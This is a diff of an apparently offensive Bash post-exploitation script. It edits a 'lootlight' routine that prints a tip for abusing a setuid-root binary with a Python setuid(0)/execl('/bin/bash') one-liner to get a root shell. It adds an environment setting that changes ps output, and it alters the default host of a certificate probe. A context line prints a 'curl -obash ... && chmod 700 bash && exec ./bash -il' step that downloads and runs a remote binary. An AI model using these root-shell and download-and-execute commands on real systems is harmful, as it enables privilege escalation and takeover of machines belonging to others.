@@ -1301,7 +1301,7 @@ lootlight() {
             echo -e "${CB}B00M-SHELL ${CDY}${CF}"
             echo "${str}"
             echo -en "${CN}"
-            echo -e "${CW}TIP: ${CDC}"'./b00m -p -c "exec '"${HS_PY:-python}"' -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
+            echo -e "${CW}TIP: ${CDC}/${str##* /}"' -p -c "exec '"${HS_PY:-python}"' -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
         }
 
         str="$( { readlink -f "${ROOTFS}"/lib64/ld-*.so.* || readlink -f "${ROOTFS}"/lib/ld-*.so.* || readlink -f "${ROOTFS}"/lib/ld-linux.so.2; } 2>/dev/null )"
@@ -1793,6 +1793,9 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
     [ -z "$TERM" ] && TERM=xterm
     export TERM
 
+    # ps to hide kernel threads (identical to '--ppid 2 -p 2 --deselect flwww')
+    export LIBPROC_HIDE_KERNEL=1
+
     HS_ARCH="$(uname -m 2>/dev/null)"
     [ -z "$HS_ARCH" ] && HS_ARCH="x86_64"
     [ "$HS_ARCH" == "x86_64" ] && HS_ARCH_ALT="amd64"
@@ -1852,7 +1855,7 @@ cn() {
     _hs_dep openssl || return
     _hs_dep sed || return
 
-    x509="$(timeout "${HS_TO_OPTS[@]}" 4 openssl s_client -showcerts -connect "${1:?}:${2:-443}" 2>/dev/null </dev/null)"
+    x509="$(timeout "${HS_TO_OPTS[@]}" 4 openssl s_client -showcerts -connect "${1:-127.0.0.1}:${2:-443}" 2>/dev/null </dev/null)"
     # Extract CN
     str="$(echo "$x509" | openssl x509 -noout -subject 2>/dev/null)"
     [[ "$str" == "subject"* ]] && [[ "$str" == *"/CN"* ]] && {
